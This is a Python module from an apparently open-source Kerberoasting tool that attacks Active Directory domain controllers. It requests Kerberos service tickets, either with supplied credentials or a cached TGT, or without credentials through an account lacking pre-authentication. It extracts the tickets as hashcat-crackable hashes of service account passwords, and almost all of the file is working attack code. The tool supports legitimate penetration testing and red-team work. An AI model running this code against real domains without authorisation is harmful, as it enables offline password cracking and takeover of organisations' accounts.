# SPDX-License-Identifier: Apache-2.0
"""TGS-REP Roast (Kerberoast) - request service tickets and extract hashes.

Supports all 5 Windows encryption types uniformly.  Targets can be
SPNs (``service/host``), sAMAccountNames (``svc_sql``), or UPNs
(``user@domain``).

Authentication: password, NTLM hash, or existing TGT from a ccache file.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from impacket.krb5.crypto import Key

import logging

from impacket.krb5.asn1 import AS_REP, TGS_REP
from pyasn1.codec.der import decoder

from kerbwolf.core.asreq import probe_account_salt, request_asrep_no_preauth, request_tgt
from kerbwolf.core.crypto import ENCTYPE_TABLE
from kerbwolf.core.tgsreq import request_tgs_raw
from kerbwolf.hashcat import format_tgs_hash, tgs_hashcat_mode
from kerbwolf.models import EncryptionType, HashFormat, KDCError, KerberosCredential, RoastResult, TransportProtocol

_log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Standard TGS-REP Roast (requires authentication)
# ---------------------------------------------------------------------------


def kerberoast(
    cred: KerberosCredential | None = None,
    *,
    dc_ip: str,
    domain: str = "",
    etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
    target_spns: list[str] | None = None,
    hash_format: HashFormat = HashFormat.HASHCAT,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
    tgt: bytes | None = None,
    tgt_session_key: Key | None = None,
    tgt_cipher_cls: type | None = None,
) -> list[RoastResult]:
    """Request TGS tickets for each target and extract crackable hashes.

    Targets should be sAMAccountNames (preferred) or UPNs.  SPNs should
    be resolved to sAMAccountNames at the CLI layer before calling this
    function — the TGS-REQ sends the target as-is in the sname field,
    and the KDC resolves sAMAccountNames to the correct service account.

    Each target is salt-probed via ETYPE-INFO2 before requesting the
    TGS ticket.  The salt-probed username goes into the hash ``$user$``
    field (required for AES cracking where the username is part of the
    PBKDF2 salt).
    """
    if target_spns is None or len(target_spns) == 0:
        return []

    etype_ints = tuple(int(e) for e in etypes)
    realm = domain or (cred.domain if cred else "")

    if tgt is not None and tgt_session_key is not None and tgt_cipher_cls is not None:
        raw_tgt, session_key, cipher_cls = tgt, tgt_session_key, tgt_cipher_cls
    elif cred is not None:
        tgt_etypes = _pick_tgt_etypes(cred)
        raw_tgt, _client_key, session_key = request_tgt(cred, dc_ip=dc_ip, etypes=tgt_etypes, transport=transport, timeout=timeout)
        cipher_cls = ENCTYPE_TABLE[session_key.enctype]
    else:
        msg = "Either credentials or a TGT (from ccache) must be provided."
        raise KDCError(error_code=0, message=msg)

    salt_cache = _probe_salts(target_spns, realm, dc_ip=dc_ip, transport=transport, timeout=timeout)

    results: list[RoastResult] = []
    for i, target in enumerate(target_spns, 1):
        _log.info("[%d/%d] %s", i, len(target_spns), target)
        try:
            raw_tgs = request_tgs_raw(
                raw_tgt,
                session_key,
                cipher_cls,
                service=target,
                domain=realm,
                dc_ip=dc_ip,
                etypes=etype_ints,
                transport=transport,
                timeout=timeout,
            )
        except KDCError:
            _log.debug("Skipped %s (KDC error)", target)
            continue
        except Exception:  # noqa: BLE001
            _log.debug("Skipped %s (unexpected error)", target, exc_info=True)
            continue

        decoded = decoder.decode(raw_tgs, asn1Spec=TGS_REP())[0]
        ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])
        _log.debug("[%d/%d] %s → ticket etype %d", i, len(target_spns), target, ticket_etype)

        if target in salt_cache:
            username, hash_realm = salt_cache[target]
        else:
            username, hash_realm = target, realm.upper()
            if ticket_etype != EncryptionType.RC4_HMAC:
                _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)

        hash_string = format_tgs_hash(raw_tgs, username, hash_realm, target, fmt=hash_format)

        results.append(
            RoastResult(
                username=username,
                realm=hash_realm,
                spn=target,
                etype=ticket_etype,
                hash_string=hash_string,
                hashcat_mode=tgs_hashcat_mode(ticket_etype),
            )
        )

    return results


# ---------------------------------------------------------------------------
# AS-REQ Kerberoast (no authentication required)
# ---------------------------------------------------------------------------


def kerberoast_no_preauth(
    no_preauth_user: str,
    *,
    domain: str,
    dc_ip: str,
    etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
    target_users: list[str] | None = None,
    hash_format: HashFormat = HashFormat.HASHCAT,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
) -> list[RoastResult]:
    """Request STs directly via AS-REQ using a DONT_REQ_PREAUTH account.

    No credentials needed - the *no_preauth_user* account is used as the
    client; *target_users* are placed in the sname field.
    """
    if target_users is None or len(target_users) == 0:
        return []

    etype_ints = tuple(int(e) for e in etypes)

    salt_cache = _probe_salts(target_users, domain, dc_ip=dc_ip, transport=transport, timeout=timeout)

    results: list[RoastResult] = []
    for i, target in enumerate(target_users, 1):
        _log.info("[%d/%d] %s (via %s)", i, len(target_users), target, no_preauth_user)
        try:
            raw_asrep = request_asrep_no_preauth(
                no_preauth_user,
                domain,
                dc_ip=dc_ip,
                etypes=etype_ints,
                server=target,
                transport=transport,
                timeout=timeout,
            )
        except KDCError:
            _log.debug("Skipped %s (KDC error)", target)
            continue
        except Exception:  # noqa: BLE001
            _log.debug("Skipped %s (unexpected error)", target, exc_info=True)
            continue

        decoded = decoder.decode(raw_asrep, asn1Spec=AS_REP())[0]
        ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])

        if target in salt_cache:
            username, hash_realm = salt_cache[target]
        else:
            username, hash_realm = target, domain.upper()
            if ticket_etype != EncryptionType.RC4_HMAC:
                _log.warning("%s: salt not verified via ETYPE-INFO2 — AES hash may not crack if username casing is wrong", target)

        hash_string = format_tgs_hash(raw_asrep, username, hash_realm, target, fmt=hash_format, is_asreq=True)

        results.append(
            RoastResult(
                username=username,
                realm=hash_realm,
                spn=target,
                etype=ticket_etype,
                hash_string=hash_string,
                hashcat_mode=tgs_hashcat_mode(ticket_etype),
            )
        )

    return results


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


_TGT_ETYPES_ALL: tuple[EncryptionType, ...] = (
    EncryptionType.AES256_CTS_HMAC_SHA1_96,
    EncryptionType.AES128_CTS_HMAC_SHA1_96,
    EncryptionType.RC4_HMAC,
)


def _pick_tgt_etypes(cred: KerberosCredential) -> tuple[EncryptionType, ...]:
    """Pick TGT etypes that let the DC auto-negotiate the strongest it supports.

    The TGT etype is independent of the attack etype (``-e``).  We
    offer AES256, AES128, and RC4 so the DC picks whatever it and the
    caller both support.  When a raw key is supplied, only that etype
    is offered (the caller already committed to it).
    """
    if cred.aes256_key:
        return (EncryptionType.AES256_CTS_HMAC_SHA1_96,)
    if cred.aes128_key:
        return (EncryptionType.AES128_CTS_HMAC_SHA1_96,)
    if cred.nthash:
        return (EncryptionType.RC4_HMAC,)
    return _TGT_ETYPES_ALL


def _probe_salts(
    targets: list[str],
    realm: str,
    *,
    dc_ip: str,
    transport: TransportProtocol,
    timeout: float,
) -> dict[str, tuple[str, str]]:
    """Probe the KDC for each target's salt via ETYPE-INFO2.

    Returns ``{target: (probed_username, probed_realm)}`` for targets
    whose salt was successfully probed.  Targets that are raw SPNs
    (contain ``/``) are skipped — SPNs should be resolved to
    sAMAccountNames at the CLI layer before reaching this function.
    """
    cache: dict[str, tuple[str, str]] = {}
    seen: set[str] = set()

    for target in targets:
        if "/" in target:
            continue

        lower = target.lower()
        if lower in seen:
            continue
        seen.add(lower)

        try:
            result = probe_account_salt(target, realm, dc_ip=dc_ip, transport=transport, timeout=timeout)
        except Exception:  # noqa: BLE001
            _log.debug("Salt probe failed for %s", target, exc_info=True)
            continue

        if result is not None:
            probed_user, probed_realm = result
            _log.debug("Salt probe: %s → %s%s", target, probed_realm, probed_user)
            cache[target] = (probed_user, probed_realm)

    return cache
